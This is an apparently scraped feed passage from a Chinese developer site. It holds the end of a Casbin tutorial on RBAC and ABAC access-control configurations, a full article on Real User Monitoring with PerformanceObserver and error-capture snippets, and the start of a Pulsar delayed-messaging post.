<li>John 可以阅读 RECORD1 ✔️</li>
<li>John 不能写入 RECORD1 ❌</li>
</ol>
<h2 data-id="heading-8">更多访问控制模型</h2>
<p>前面演示了最简单的 ACL 访问控制模型，下面我们看看如何定义其他常见的访问控制模型，如 RBAC，ABAC 等。</p>
<h3 data-id="heading-9">基于角色的访问控制（RBAC）</h3>
<p>ACL 提供了一对一的操作授权。这种方式在现实使用中往往会导致较大的工作量，RBAC将用户分配到不同的角色，并将权限分配给角色，而不是分配给单个用户。</p>
<blockquote>
<p>假设共有三个用户：user1、user2 和 user3，以及两个角色：admin 和 user。在这种情况下，我们定义权限的对象是角色，而不是单个用户。</p>
<p>用户1和用户2拥有用户角色，<br/>
用户3拥有管理员角色。</p>
<p>用户只能读取记录1（user1，user2），<br/>
管理员可以读写记录1（user3）。</p>
</blockquote>
<p><strong>Casbin 模型配置</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[request_definition]</span>
<span class="hljs-attr">r</span> = sub, obj, act

<span class="hljs-section">[policy_definition]</span>
<span class="hljs-attr">p</span> = sub, obj, act

<span class="hljs-section">[role_definition]</span>
<span class="hljs-attr">g</span> = _, _

<span class="hljs-section">[policy_effect]</span>
<span class="hljs-attr">e</span> = some(where (p.eft == allow))

<span class="hljs-section">[matchers]</span>
<span class="hljs-attr">m</span> = g(r.sub, p.sub) &amp;&amp; r.obj == p.obj &amp;&amp; r.act == p.act

</code></pre>
<p>与之前相同，但我们<code>g</code>在这里添加了一个参数。</p>
<p><code>g = _, _</code>定义了用户的角色。</p>
<p><code>matcher</code>中也增加了一个表达式<code>g(r.sub, p.sub)</code>，表示了<code>g</code>的字段，第一个是 <code>r.sub</code>表示发起请求的主体即用户，第二个是<code>p.sub</code>表示授权的主体即角色，下面我们就可以在 policy 列表中定义用户所属的角色信息了。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// user1 是管理员 admin，admin 可以写 record1 ，也就是 user1 可以写 record1</span>

p, admin, record1, write
g, user1, admin
</code></pre>
<h3 data-id="heading-10">基于资源角色的RBAC</h3>
<p>就像我们将用户分组为角色一样，我们也可以将资源分组并进行分配，而不是一次分配一个资源。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[request_definition]</span>
<span class="hljs-attr">r</span> = sub, obj, act

<span class="hljs-section">[policy_definition]</span>
<span class="hljs-attr">p</span> = sub, obj, act

<span class="hljs-section">[role_definition]</span>
<span class="hljs-attr">g</span> = _, _
<span class="hljs-attr">g2</span> = _, _

<span class="hljs-section">[policy_effect]</span>
<span class="hljs-attr">e</span> = some(where (p.eft == allow))

<span class="hljs-section">[matchers]</span>
<span class="hljs-attr">m</span> = g(r.sub, p.sub) &amp;&amp; g2(r.obj, p.obj) &amp;&amp; r.act == p.act
</code></pre>
<p>这里我们添加了<code>g2</code>一个参数。</p>
<p><code>g2 = _, _</code>定义资源的角色。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// record1 和 record2 被分组到记录中，用户 1 可以写入记录，这意味着用户 1 可以同时写入 record1 和 record2。p、用户1、记录、写入</span>

p, user1, record, write  
g2, record1, record  
g2, record2, record
</code></pre>
<h3 data-id="heading-11">基于域（租户）的RBAC</h3>
<p>这是基于角色的访问控制 (RBAC) 的另一种版本，当系统中存在多个租户时，它至关重要。<em>用户在不同的租户中扮演不同的角色</em>。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[request_definition]</span>
<span class="hljs-attr">r</span> = sub, dom, obj, act

<span class="hljs-section">[policy_definition]</span>
<span class="hljs-attr">p</span> = sub, dom, obj, act

<span class="hljs-section">[role_definition]</span>
<span class="hljs-attr">g</span> = _, _, _

<span class="hljs-section">[policy_effect]</span>
<span class="hljs-attr">e</span> = some(where (p.eft == allow))

<span class="hljs-section">[matchers]</span>
<span class="hljs-attr">m</span> = g(r.sub, p.sub, r.dom) &amp;&amp; r.dom == p.dom &amp;&amp; r.obj == p.obj &amp;&amp; r.act == p.act
</code></pre>

<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">//用户1是租户1的管理员，用户2是租户2的管理员。租户1的管理员（即用户1）可以读取和写入数据1。同样，租户2的管理员（即用户2）可以读取和写入数据2。这也意味着用户1没有读取/写入数据2的权限，反之亦然。</span>

<span class="hljs-selector-tag">p</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant1</span>, <span class="hljs-selector-tag">data1</span>, <span class="hljs-selector-tag">read</span>
<span class="hljs-selector-tag">p</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant1</span>, <span class="hljs-selector-tag">data1</span>, <span class="hljs-selector-tag">write</span>
<span class="hljs-selector-tag">p</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant2</span>, <span class="hljs-selector-tag">data2</span>, <span class="hljs-selector-tag">read</span>
<span class="hljs-selector-tag">p</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant2</span>, <span class="hljs-selector-tag">data2</span>, <span class="hljs-selector-tag">writeg</span>, <span class="hljs-selector-tag">user1</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant1</span>
<span class="hljs-selector-tag">g</span>, <span class="hljs-selector-tag">user2</span>, <span class="hljs-selector-tag">admin</span>, <span class="hljs-selector-tag">tenant2</span>
</code></pre>
<h3 data-id="heading-12">基于属性的访问控制（ABAC）</h3>
<p>如果上述任何模型都无法解决您的用例，还有另一种模型可以提供更细粒度的搜索/匹配。评估是基于特定属性（例如用户属性）进行的。在 Casbin 中，这些属性可以是主体、客体或操作的属性。</p>
<p>例如，基于角色的访问控制（RBAC）系统会授予所有经理访问权限，而基于属性的访问控制（ABAC）策略则只会授予财务部门经理访问权限。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[request_definition]</span>
<span class="hljs-attr">r</span> = sub, obj, act

<span class="hljs-section">[policy_definition]</span>
<span class="hljs-attr">p</span> = sub, obj, act

<span class="hljs-section">[policy_effect]</span>
<span class="hljs-attr">e</span> = some(where (p.eft == allow))

<span class="hljs-section">[matchers]</span>
<span class="hljs-attr">m</span> = r.sub == r.obj.Owner
</code></pre>
<p>此模态配置仅检查发出请求的用户是否是所请求对象的拥有者。</p>
<p>假设有以下请求：</p>
<blockquote>
<p>user1 请求访问 {Owner:"user1"}<br/>
user1 请求访问 {Owner:"user2"}</p>
</blockquote>
<p>映射到 <code>r = sub,obj,act</code></p>
<blockquote>
<p>sub= user1<br/>
obj= {Owner:"user1"}</p>
</blockquote>
<p>又有<code>r.sub == r.obj.Owner</code></p>
<blockquote>
<p>user1 == user1 // 第一个请求被允许<br/>
user1 != user2 // 第二个请求无法匹配 matcher，所以被拒绝</p>
</blockquote>
<h2 data-id="heading-13">官方文档和工具</h2>
<p>同样，Casbin 支持定义各种丰富的模型以适应不同的业务场景。您可以通过官方文档<a href="https://link.juejin.cn?target=https%3A%2F%2Fcasbin.org%2Fzh%2Fdocs%2Fsupported-models" target="_blank" title="https://casbin.org/zh/docs/supported-models" ref="nofollow noopener noreferrer">《支持的模型》</a>进一步了解其他访问控制模型。</p>
<p>也可以利用官方提供的<a href="https://link.juejin.cn?target=https%3A%2F%2Fcasbin.org%2Feditor%2F" target="_blank" title="https://casbin.org/editor/" ref="nofollow noopener noreferrer">Casbin 在线编辑器</a>尝试编写和执行不同的模型和策略。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用户说卡但我测不出来？RUM 监控：直接去 “用户手机里” 抓薛定谔的 Bug]]></title>    <link>https://juejin.cn/post/7581752508780724267</link>    <guid>https://juejin.cn/post/7581752508780724267</guid>    <pubDate>2025-12-10T03:36:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581752508780724267" data-draft-id="7581761825482719268" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用户说卡但我测不出来？RUM 监控：直接去 “用户手机里” 抓薛定谔的 Bug"/> <meta itemprop="keywords" content="前端,性能优化"/> <meta itemprop="datePublished" content="2025-12-10T03:36:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="PineappleCoder"/> <meta itemprop="url" content="https://juejin.cn/user/3323167184272627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用户说卡但我测不出来？RUM 监控：直接去 “用户手机里” 抓薛定谔的 Bug
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3323167184272627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    PineappleCoder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:36:21.000Z" title="Wed Dec 10 2025 03:36:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">⚡️ 告别“薛定谔的 Bug”：RUM 如何精准捕获线上卡顿，让性能优化不再靠玄学？</h2>
<blockquote>
<p><strong>前端性能优化专栏 - 第二篇</strong></p>
</blockquote>
<p>在性能优化的路上，我们总会遇到一个让人抓狂的“灵异事件”：用户反馈页面卡得像幻灯片，但你在本地、在公司、在高速网络下测试，它却流畅得像德芙巧克力。</p>
<p>我们把这种现象戏称为“<strong>薛定谔的 Bug</strong>”——你打开看的时候，它就消失了。那么，如何才能打破这个魔咒，让性能优化从“玄学”变成“科学”呢？答案就是：<strong>RUM（真实用户监控）</strong> 。</p>
<h3 data-id="heading-1">⚠️ “薛定谔的 Bug”：线上卡顿但无法复现</h3>
<p>想象一下这个场景：</p>
<ol>
<li><strong>用户反馈：</strong> “你们的页面太卡了，点个按钮要等半天！”</li>
<li><strong>你测试：</strong> 刷新、点击、滚动，一切丝滑流畅，耗时不到 100ms。</li>
<li><strong>你的内心：</strong> “是不是用户手机太烂了？”</li>
</ol>
<p>这种<strong>线上卡顿，本地流畅</strong>的差异，往往让开发者陷入深深的自我怀疑。问题根源可能隐藏在<strong>资源加载、渲染或复杂的交互延迟</strong>中，而这些问题，在你的“完美”开发环境中根本无从察觉。</p>
<h3 data-id="heading-2">✨ 环境差异的根源：性能的“黑洞”</h3>
<p>为什么你的环境是“天堂”，用户的环境却是“地狱”？因为你们的<strong>环境差异</strong>太大了！</p>



































<table><thead><tr><th>差异维度</th><th>你的环境（开发/测试）</th><th>用户的环境（真实线上）</th><th>性能影响</th></tr></thead><tbody><tr><td><strong>网络条件</strong></td><td>稳定 Wi-Fi / 专线</td><td>3G/4G 切换、地铁弱信号</td><td>资源加载耗时、TTFB</td></tr><tr><td><strong>设备性能</strong></td><td>高配笔电、旗舰手机</td><td>低端手机、老旧平板</td><td>JS 执行速度、渲染速度</td></tr><tr><td><strong>浏览器版本</strong></td><td>最新 Chrome/Safari</td><td>各种版本、不同内核</td><td>API 支持、渲染机制差异</td></tr><tr><td><strong>地理位置</strong></td><td>靠近服务器的 CDN 节点</td><td>偏远地区的 CDN 节点</td><td>首字节时间（TTFB）</td></tr></tbody></table>
<p>与其在本地一遍遍地尝试“复现问题”，不如换个思路：<strong>直接去用户的“案发现场”收集证据！</strong> 这正是 <strong>RUM（Real User Monitoring）</strong> 的核心思想。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20e5487dae7942f5ba0673778cca7c91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUGluZWFwcGxlQ29kZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942635&amp;x-signature=2onk2OfnSTfr6jVqTl4ed8GeYRA%3D" alt="环境差异对比图" loading="lazy"/></p>
<h3 data-id="heading-3">🔧 什么是 RUM（真实用户监控）？</h3>
<p><strong>RUM</strong>，全称 <strong>Real User Monitoring</strong>，顾名思义，就是一套采集<strong>真实用户访问数据</strong>的监控体系。</p>
<p>它就像一个潜伏在用户浏览器中的“性能侦探”，默默地捕获并回传用户的<strong>性能指标、环境信息和异常日志</strong>。</p>
<blockquote>
<p><strong>专业名词解释：RUM</strong> 是一种<strong>被动式</strong>的性能监控方法，它通过在用户浏览器中植入一段 JavaScript 代码，来实时收集用户在页面上的各种性能数据和行为数据，并将数据上报到服务器进行分析。</p>
</blockquote>
<p><strong>RUM 的目标非常明确：</strong> 帮助开发者<strong>还原现场、定位瓶颈、验证优化效果</strong>。它将“用户说卡”这个模糊的定性描述，转化为可量化的数据指标。</p>
<h3 data-id="heading-4">🚀 RUM 的核心组成：三大法宝</h3>
<p>一个完整的 RUM 体系，通常由以下三个核心部分组成：</p>
<h4 data-id="heading-5">1. 性能数据采集：量化“卡顿”的体感</h4>
<p>“卡顿”是一种主观感受，但 RUM 能用客观指标来量化它。我们主要关注 Google 推荐的 <strong>Core Web Vitals</strong>（核心 Web 指标）以及其他关键指标：</p>









































<table><thead><tr><th>指标名称</th><th>英文缩写</th><th>衡量目标</th><th>对应“卡顿”体感</th></tr></thead><tbody><tr><td><strong>最大内容绘制</strong></td><td>LCP</td><td>页面加载速度（最大元素出现时间）</td><td>“页面白屏很久”</td></tr><tr><td><strong>首次输入延迟</strong></td><td>FID</td><td>页面交互响应速度（首次点击到响应）</td><td>“点按钮没反应”</td></tr><tr><td><strong>累积布局偏移</strong></td><td>CLS</td><td>页面视觉稳定性</td><td>“页面元素乱跳”</td></tr><tr><td><strong>首次绘制</strong></td><td>FP/FCP</td><td>页面开始渲染的时间</td><td>“页面开始有东西了”</td></tr><tr><td><strong>首字节时间</strong></td><td>TTFB</td><td>服务器响应速度</td><td>“网络慢不慢”</td></tr></tbody></table>
<p><strong>技术实现：PerformanceObserver API</strong></p>
<p>现代浏览器提供了强大的 <code>PerformanceObserver</code> API，让我们能够实时监听这些关键性能指标的变化，并将其上报。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
  list.<span class="hljs-title function_">getEntries</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
    <span class="hljs-comment">// 收集 LCP, FID, CLS 等数据</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(entry.<span class="hljs-property">name</span>, entry.<span class="hljs-property">startTime</span>, entry.<span class="hljs-property">duration</span>)
    <span class="hljs-comment">// report(entry) // 上报到 RUM 服务器</span>
  })
})
​
<span class="hljs-comment">// 监听关键指标</span>
observer.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'largest-contentful-paint'</span>, <span class="hljs-string">'first-input'</span>, <span class="hljs-string">'layout-shift'</span>] })
</code></pre>
<h4 data-id="heading-6">2. 异常日志收集：捕获“意外”现场</h4>
<p>性能问题不只是慢，还包括“崩”。RUM 体系必须能捕获各种意料之外的错误，防止用户体验彻底中断。</p>
<ul>
<li><strong>JS 执行错误：</strong> 通过 <code>window.onerror</code> 捕获未被 <code>try...catch</code> 的同步错误。</li>
<li><strong>资源加载失败：</strong> 监听全局的 <code>error</code> 事件，捕获图片、CSS、JS 等资源加载失败的情况。</li>
<li><strong>Promise 未处理异常：</strong> 通过 <code>unhandledrejection</code> 捕获 Promise 链中没有 <code>catch</code> 的错误。</li>
</ul>

<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 捕获 JS 错误</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'error'</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
  <span class="hljs-title function_">report</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'js-error'</span>, <span class="hljs-attr">message</span>: e.<span class="hljs-property">message</span> })
})
​
<span class="hljs-comment">// 捕获 Promise 异常</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'unhandledrejection'</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
  <span class="hljs-title function_">report</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'promise-rejection'</span>, <span class="hljs-attr">reason</span>: e.<span class="hljs-property">reason</span> })
})
</code></pre>
<h4 data-id="heading-7">3. 环境信息：还原用户的“案发现场”</h4>
<p>光有性能数据还不够，我们还需要知道<strong>是谁、在哪里、用什么</strong>遇到了问题。这些环境信息是数据聚合分析的关键，能帮助我们快速定位<strong>共性问题</strong>（比如“所有华为手机用户都卡顿”）。</p>
<ul>
<li>🖥️ <strong>设备信息：</strong> 设备型号、内存、屏幕分辨率。</li>
<li>⏱️ <strong>操作系统：</strong> 操作系统类型与版本（如 iOS 17.0, Android 14）。</li>
<li>🌐 <strong>浏览器信息：</strong> 浏览器类型与版本（如 Chrome 120, Safari 17）。</li>
<li>📊 <strong>网络类型：</strong> 用户的网络连接类型（如 4G, Wi-Fi）。</li>
<li>🗺️ <strong>地理位置：</strong> 用户的国家/城市，用于分析地域性 CDN 差异。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f975de70309c43ee99cb7b6e620c50ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUGluZWFwcGxlQ29kZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942635&amp;x-signature=5MTjG5FMz74DwblNb6CfjCzPc8g%3D" alt="RUM 数据流示意图" loading="lazy"/></p>
<h3 data-id="heading-8">💡 总结：让数据成为你最可靠的依据</h3>
<p>“薛定谔的 Bug”并不可怕，可怕的是我们没有工具去揭开它的面纱。</p>
<p><strong>无法复现 ≠ 无法解决。</strong></p>
<p>RUM 体系将性能优化从“凭感觉”和“靠运气”的阶段，带入了<strong>数据驱动</strong>的科学时代。建立一个系统性的 RUM 体系，让每一次“卡顿反馈”都能被精准捕获、分析和优化。</p>
<p><strong>性能优化是一场持久战，而 RUM 就是我们最可靠的雷达。</strong></p>
<hr/>
<p><strong>下一篇预告：</strong> 既然我们已经了解了 RUM 的重要性，那么下一篇我们将深入讲解 RUM 的核心采集利器——<strong>PerformanceObserver API</strong>，手把手教你如何用它来精准监控页面性能指标。敬请期待！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【pulsar】pulsar的定时发送实现原理]]></title>    <link>https://juejin.cn/post/7581741663184011299</link>    <guid>https://juejin.cn/post/7581741663184011299</guid>    <pubDate>2025-12-10T03:37:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581741663184011299" data-draft-id="7581299982671937570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【pulsar】pulsar的定时发送实现原理"/> <meta itemprop="keywords" content="后端,消息队列,开源"/> <meta itemprop="datePublished" content="2025-12-10T03:37:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Sincerelyplz"/> <meta itemprop="url" content="https://juejin.cn/user/959206842703773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【pulsar】pulsar的定时发送实现原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/959206842703773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Sincerelyplz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:37:22.000Z" title="Wed Dec 10 2025 03:37:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 